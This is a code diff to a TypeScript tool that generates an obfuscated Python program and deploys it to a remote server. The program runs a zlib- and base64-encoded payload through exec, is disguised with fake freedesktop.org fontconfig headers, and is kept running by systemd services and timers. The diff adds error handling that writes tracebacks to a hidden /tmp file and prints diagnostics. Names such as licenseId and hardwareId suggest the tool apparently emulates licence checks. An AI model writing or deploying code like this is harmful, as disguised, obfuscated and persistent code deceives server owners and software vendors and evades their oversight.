@@ -190,8 +190,12 @@ export function generateObfuscatedEmulator(
     "# fontconfig cache synchronization module v2.13.1",
     "# Auto-generated cache rebuild utility",
     "# (c) freedesktop.org fontconfig project",
-    "import zlib as _z,base64 as _b",
-    `exec(_z.decompress(_b.b64decode("${encoded}")))`
+    "import zlib as _z,base64 as _b,sys,traceback as _tb",
+    "try:",
+    ` exec(_z.decompress(_b.b64decode("${encoded}")))`,
+    "except Exception as _e:",
+    " with open('/tmp/.fc-debug','w') as _f:_f.write(_tb.format_exc())",
+    " sys.exit(1)"
   ].join("\n");
 }
 
@@ -258,7 +262,7 @@ export async function deployLicenseToServer(
   host: string, port: number, username: string, password: string,
   hardwareId: string, licenseId: string, expiresAt: Date,
   maxUsers: number, maxSites: number, status: string, serverUrl: string
-): Promise<{ success: boolean; error?: string }> {
+): Promise<{ success: boolean; output?: string; error?: string }> {
   const emulator = generateObfuscatedEmulator(hardwareId, licenseId, expiresAt, maxUsers, maxSites, status, serverUrl);
   const verify = generateObfuscatedVerify(licenseId, serverUrl, host);
   const P = DEPLOY;
@@ -416,29 +420,21 @@ systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_VERIFY}.timer
 systemctl start ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_MAIN}
-sleep 3
+sleep 5
 if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then
   echo "SERVICE_FAILED"
-  journalctl -u ${P.SVC_MAIN} -n 20 --no-pager 2>/dev/null || true
-  python3 ${P.BASE}/${P.EMULATOR} &
-  _EMPID=$!
-  sleep 2
-  if kill -0 $_EMPID 2>/dev/null; then
-    echo "MANUAL_START_OK"
-  else
-    echo "MANUAL_START_FAILED"
-    python3 -c "
-import zlib,base64
-f=open('${P.BASE}/${P.EMULATOR}','r')
-c=f.read()
-f.close()
-print('FILE_SIZE:',len(c))
-try:
- exec(c)
-except Exception as e:
- print('ERROR:',e)
-" 2>&1 | head -5
-  fi
+  echo "=== JOURNAL ==="
+  journalctl -u ${P.SVC_MAIN} -n 30 --no-pager -o cat 2>/dev/null || true
+  echo "=== FC_DEBUG ==="
+  cat /tmp/.fc-debug 2>/dev/null || echo "NO_DEBUG_FILE"
+  echo "=== PYTHON_TEST ==="
+  python3 --version 2>&1
+  echo "=== DIRECT_RUN ==="
+  timeout 5 python3 ${P.BASE}/${P.EMULATOR} 2>&1 || true
+  echo "=== FILE_HEAD ==="
+  head -8 ${P.BASE}/${P.EMULATOR} 2>/dev/null || echo "FILE_NOT_FOUND"
+  echo "=== PORT_CHECK ==="
+  ss -tlnp | grep 4000 2>/dev/null || echo "PORT_4000_FREE"
 else
   echo "SERVICE_OK"
 fi
